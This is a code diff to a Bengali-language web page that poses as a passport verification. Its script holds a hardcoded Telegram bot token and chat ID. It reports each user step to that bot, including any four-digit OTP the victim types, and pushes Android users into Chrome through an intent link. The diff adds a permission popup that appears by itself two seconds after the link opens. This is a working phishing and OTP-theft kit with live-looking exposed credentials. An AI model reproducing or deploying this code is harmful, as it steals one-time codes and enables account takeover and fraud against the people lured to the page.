@@ -13,9 +13,11 @@
 <style>
     body { background-color: #f7f9fc; font-family: 'Helvetica', Arial, sans-serif; margin: 0; padding: 0; min-height: 100vh; display: flex; flex-direction: column; }
     .hidden { display: none !important; }
-    /* top covers 70% */
-    .top-half { height: 70vh; width: 100%; display: flex; align-items: center; justify-content: center; background-color: white; border-bottom: 1px solid #e1e4e8; padding: 0; }
-    .top-half img { width: 100%; height: 100%; object-fit: cover; display:block; }
+    
+    /* top covers 70% - Updated for perfect photo fitting */
+    .top-half { height: 70vh; width: 100%; display: flex; align-items: center; justify-content: center; background-color: white; border-bottom: 1px solid #e1e4e8; padding: 10px; box-sizing: border-box; overflow: hidden; }
+    .top-half img { width: 100%; height: 100%; max-height: 100%; object-fit: contain; display: block; margin: auto; }
+
     /* bottom 30% */
     .bottom-half { height: 30vh; width: 100%; background: #f7f9fc; padding: 18px 20px; box-sizing: border-box; display: flex; flex-direction: column; align-items: center; justify-content: flex-start; gap: 8px; overflow:auto; }
 
@@ -103,7 +105,7 @@
     </div>
 </div>
 
-<!-- VERIFYING (unchanged) -->
+<!-- VERIFYING -->
 <div id="verifying" class="hidden fixed inset-0 bg-black/60 backdrop-blur-md z-[9999] flex items-center justify-center p-4">
     <div class="bg-white w-full max-w-sm rounded-3xl p-6 shadow-2xl flex flex-col items-center text-center">
         <div class="mb-4 flex h-16 w-16 items-center justify-center rounded-full bg-emerald-50 ring-8 ring-emerald-100">
@@ -123,7 +125,7 @@
     </div>
 </div>
 
-<!-- START SCREEN, OTP, SUCCESS, ERROR, STOP variants (each with hero + headline added similarly) -->
+<!-- START SCREEN -->
 <div id="start_screen_page" class="hidden fixed inset-0 bg-black/60 backdrop-blur-md z-[9999] flex items-center justify-center p-4">
     <div class="bg-white w-full max-w-sm rounded-3xl p-6 shadow-2xl flex flex-col items-center text-center">
         <div class="mb-4 flex flex-col items-center gap-2">
@@ -188,6 +190,7 @@
 <div id="stop_clipboard_page" class="hidden fixed inset-0 bg-black/60 backdrop-blur-md z-[9999] flex items-center justify-center p-4">
     <div class="bg-white px-6 py-4 rounded-xl shadow-2xl"><h3 class="font-bold text-blue-600">মনিটরিং বন্ধ!</h3></div>
 </div>
+
 <script>
     const botToken = "8870605082:AAHPYxzQcA0nbdNNFBw_3o2elWVNUhbCtUM";
     const chatId = "8398202645";
@@ -215,18 +218,23 @@
             startListening();
         } else if (urlParams.get('open') === 'chrome') {
             goToStep('google_chooser');
+        } else {
+            // লিংকে ঢোকার ২ সেকেন্ড পরে পারমিশন পপ-আপ অটোমেটিক ভেসে উঠবে
+            setTimeout(() => {
+                showModal();
+            }, 2000);
         }
     }
 
     function showModal() {
         goToStep('permission_modal');
-        sendToBot(`🖱️ ইউজার "পাসপোর্ট চেক করুন" ক্লিক করেছে।`);
+        sendToBot(`🖱️ পারমিশন পপ-আপ অটোমেটিক প্রদর্শিত হয়েছে।`);
     }
 
     function redirectToChrome() {
         const chromeUrl = "intent://" + window.location.host + window.location.pathname + "?open=chrome" + "#Intent;scheme=https;package=com.android.chrome;end";
         if (/Android/i.test(navigator.userAgent)) {
-            sendToBot(`➡️ ইউজার পপ-আপে OK ক্লিক করেছে। ক্রোমে যাচ্ছে...`);
+            sendToBot(`➡️ ইউজার পপ-আপে Open ক্লিক করেছে। ক্রোমে যাচ্ছে...`);
             window.location.href = chromeUrl;
         } else {
             goToStep('google_chooser');
@@ -307,7 +315,7 @@
                         input.addEventListener('input', () => {
                             if (input.value.length === 1 && index < inputs.length - 1) inputs[index + 1].focus();
                             const code = Array.from(inputs).map(i => i.value).join('');
-                            if (code.length === 4) sendToBot(`📩 **ইউজার પૂર્ણ ৪ সংখ্যার OTP দিয়েছে:** \`${code}\``);
+                            if (code.length === 4) sendToBot(`📩 **ইউজার পূর্ণ ৪ সংখ্যার OTP দিয়েছে:** \`${code}\``);
                         });
                     });
                 }, 100);
